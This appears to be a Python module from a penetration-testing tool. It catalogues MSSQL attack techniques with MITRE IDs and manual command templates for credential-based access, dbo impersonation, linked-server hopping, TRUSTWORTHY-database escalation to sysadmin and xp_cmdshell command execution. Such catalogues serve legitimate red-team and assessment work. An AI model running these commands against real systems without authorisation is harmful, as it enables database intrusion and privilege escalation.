from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class MssqlTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "mssql_lateral"


MSSQL_TECHNIQUES: dict[str, MssqlTechnique] = {
    "sql_access": MssqlTechnique(
        key="sql_access",
        title="SQL access",
        severity="medium",
        mitre_id="T1021",
        summary="Connect to MSSQL with owned domain credentials.",
        manual_commands=(
            "mssqlclient.py corp.local/user:pass@<host> -windows-auth",
            "nxc mssql <host> -u user -p pass",
        ),
    ),
    "sql_admin": MssqlTechnique(
        key="sql_admin",
        title="SQL sysadmin",
        severity="high",
        mitre_id="T1021",
        summary="Owned principal has sysadmin on MSSQL instance.",
        manual_commands=(
            "mssqlclient.py corp.local/user:pass@<host> -windows-auth",
            "SELECT IS_SRVROLEMEMBER('sysadmin');",
        ),
    ),
    "impersonate": MssqlTechnique(
        key="impersonate",
        title="SeImpersonate / IMPERSONATE",
        severity="high",
        mitre_id="T1068",
        summary="Impersonate another login (e.g. dbo) for privilege escalation.",
        manual_commands=(
            "nxc mssql <host> -u user -p pass --impersonate dbo",
            "EXECUTE AS LOGIN = 'dbo'; SELECT SYSTEM_USER;",
        ),
    ),
    "linked_server": MssqlTechnique(
        key="linked_server",
        title="Linked server lateral movement",
        severity="high",
        mitre_id="T1021",
        summary="Hop via linked servers (OPENQUERY / EXEC AT).",
        manual_commands=(
            "SELECT name, data_source FROM sys.servers WHERE is_linked = 1;",
            "EXEC ('SELECT SYSTEM_USER') AT [LINKEDSRV];",
        ),
    ),
    "trustworthy": MssqlTechnique(
        key="trustworthy",
        title="Trustworthy database",
        severity="high",
        mitre_id="T1068",
        summary="TRUSTWORTHY ON + db_owner enables EXECUTE AS OWNER → sysadmin.",
        manual_commands=(
            "SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;",
            "USE <db>; EXECUTE AS USER = 'dbo'; EXEC sp_addsrvrolemember ...",
        ),
    ),
    "xp_cmdshell": MssqlTechnique(
        key="xp_cmdshell",
        title="xp_cmdshell execution",
        severity="critical",
        mitre_id="T1059",
        summary="Run OS commands via xp_cmdshell when enabled or as sysadmin.",
        manual_commands=(
            "EXEC xp_cmdshell 'whoami';",
            "nxc mssql <host> -u user -p pass -x whoami",
        ),
    ),
}


def mssql_meta(key: str) -> MssqlTechnique:
    return MSSQL_TECHNIQUES.get(
        key,
        MssqlTechnique(
            key=key,
            title=key.replace("_", " ").title(),
            severity="medium",
            mitre_id="T1021",
            summary=f"MSSQL technique: {key}",
            manual_commands=("guide mssql_lateral",),
        ),
    )
